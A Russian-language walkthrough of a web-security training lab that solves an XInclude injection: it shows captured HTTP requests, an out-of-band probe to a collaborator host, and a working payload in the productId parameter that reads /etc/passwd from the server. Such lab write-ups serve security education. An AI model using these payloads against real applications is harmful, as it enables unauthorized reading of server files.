Эта лаборатория содержит уязвимость, которая позволяет вам читать произвольные файлы с сервера. Чтобы решить эту лабораторию, извлеките содержимое `/etc/passwd`в течение 10 минут.

## Дано

уязвимость которая позволяет читать произвольные файлы с сервера.

время 10 минут на выполнение

## Задача

 извлечь содержимое `/etc/passwd`

# Решение 

Бегло пробежаться по функционалу сайту и просмотреть какие запросы от нас уходят и что нам отправляет сервер

Мы нашли такой запрос
```
POST /product/stock HTTP/2
Host: 0aca00bf03b07bb380a20d1200310064.web-security-academy.net
Cookie: session=QRd7UQDJmmmrOHhcUqp9ceJLra5s3wjM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0aca00bf03b07bb380a20d1200310064.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0aca00bf03b07bb380a20d1200310064.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

productId=1&storeId=1
```

В котором активное сканирование нашло уязвимость Out-of-band resource load (HTTP) и XML 
![[Pasted image 20250210112258.png]]

## XML 

Параметр `productId` уязвим к XML-инъекции. На сервер был отправлен следующий вредоносный payload:
```
<aic xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://ukieu5axvljf6bs12zfstgg48veo2fqge81ypn.oastify.com/foo"/>
</aic>
```
Этот payload содержит XML, который ссылается на URL внешнего домена. Приложение взаимодействовало с этим доменом, что указывает на то, что парсер обработал внедрённый XML.

#### Формируем полезную нагрузку
```
POST /product/stock HTTP/2
Host: 0aca00bf03b07bb380a20d1200310064.web-security-academy.net
Cookie: session=QRd7UQDJmmmrOHhcUqp9ceJLra5s3wjM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0aca00bf03b07bb380a20d1200310064.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0aca00bf03b07bb380a20d1200310064.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=0
Te: trailers

productId=%3caic%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%20%20%3cxi%3ainclude%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%20parse%3d%22text%22%2f%3e%0d%0a%3c%2faic%3e&storeId=1
```

```
%3caic%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%20%20%3cxi%3ainclude%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%20parse%3d%22text%22%2f%3e%0d%0a%3c%2faic%3e

это

<aic xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</aic>
```